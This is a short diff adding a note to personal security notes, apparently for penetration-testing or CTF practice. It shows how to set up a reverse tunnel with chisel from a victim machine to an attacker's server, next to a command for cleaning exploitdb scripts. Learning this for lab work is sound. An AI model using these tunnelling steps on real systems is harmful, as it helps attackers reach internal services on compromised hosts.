@@ -20,3 +20,8 @@ NOTES
 ### Removing `\r` in `exploitdb` scripts
 
     sed -i -e 's/\r$//' <script's name>
+
+### Port Forwarding with chisel
+
+- Set up a server with `chisel server -p <port> --reverse` on the attacker machine
+- On the client's machine, use `./chisel client [chisel server's ip]:[chisel's server port} R:[port you want it to tunnel through on the server's machine]:127.0.0.1:[internal port running a service on the victim's machine]`
